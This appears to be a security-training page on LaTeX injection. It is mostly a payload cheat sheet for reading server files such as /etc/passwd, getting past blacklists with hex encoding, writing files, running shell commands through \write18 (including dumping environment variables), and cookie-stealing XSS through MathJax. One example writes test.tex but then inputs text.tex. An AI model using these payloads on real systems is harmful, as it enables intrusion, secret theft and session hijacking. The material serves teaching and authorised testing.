---
layout: training-page
title: "LaTeX Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - latex-injection
  - rce
  - file-read
  - server-side-injection
page_key: "web-latex-injection"
render_with_liquid: false
---

# LaTeX Injection

LaTeX Injection occurs when untrusted user input is embedded into a LaTeX document that is then compiled by a LaTeX processor (such as pdflatex or xelatex). Because LaTeX is a full scripting language with access to the filesystem and shell, attackers can read arbitrary files, write files, execute commands, and in some cases trigger cross-site scripting in generated output.

## File Read

### Read and Interpret File as LaTeX

The `\input` and `\include` commands load and interpret the target file as LaTeX source. This works for text files but will cause errors if the file contains characters with special LaTeX meaning:

```
\input{/etc/passwd}
\include{somefile}  % loads somefile.tex
```

### Read a Single Line

```
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

### Read Multiple Lines

```
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

### Read Without Interpreting (Verbatim)

Pastes raw file content without processing LaTeX commands inside it. Useful for files containing special characters:

```
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

### Handle Special Characters in Target Files

If the injection point is past the document header (so `\usepackage` cannot be used), deactivate special characters with `\catcode` to allow `\input` on files containing `$`, `#`, `_`, `&` (e.g., Perl scripts):

```
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

### Blacklist Bypass — Unicode Hex Encoding

Replace characters with their Unicode hex equivalents to bypass blacklist filters. The `^^` prefix followed by two hex digits represents a character:

- `^^41` = capital A (U+0041)
- `^^7e` = tilde ~ (note: lowercase `e` required)

```
\lstin^^70utlisting{/etc/passwd}
% ^^70 = 'p', so this becomes \lstinputlisting{/etc/passwd}
```

## File Write

Write arbitrary content to files on the server using `\newwrite` and `\openout`:

```
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

## Command Execution

The `\write18` (shell escape) directive executes system commands. The output goes to stdout and is not automatically captured — redirect it to a temporary file then include that file in the document:

```
\immediate\write18{id > output}
\input{output}
```

Use base64 encoding to avoid characters that break LaTeX parsing in the output:

```
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

Alternative pipe syntax for command execution:

```
\input|ls|base64
\input{|"/bin/hostname"}
```

## Cross-Site Scripting via LaTeX

When LaTeX output is rendered in a browser (e.g., via MathJax or a web-based LaTeX renderer), some commands produce clickable links that execute JavaScript:

```
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

In MathJax specifically, the `\unicode` extension allows injecting arbitrary HTML:

```
\unicode{<img src=1 onerror="alert(document.cookie)">}
```

## Detection Context

Look for LaTeX injection opportunities in:

- PDF generation endpoints (reports, invoices, certificates)
- Math rendering on educational platforms
- Scientific paper submission systems
- Any input field that feeds into a LaTeX document template

Test with benign payloads first: `\textbf{test}` appearing as bold text in the output confirms LaTeX is being processed.

## Resources

- Root Me — LaTeX Input challenge — `root-me.org/en/Challenges/App-Script/LaTeX-Input`
- Root Me — LaTeX Command Execution challenge — `root-me.org/en/Challenges/App-Script/LaTeX-Command-execution`
- Hacking with LaTeX — Sebastian Neef — 0day.work
- LaTeX to RCE, Private Bug Bounty Program — Yasho
- Pwning coworkers thanks to LaTeX — scumjr
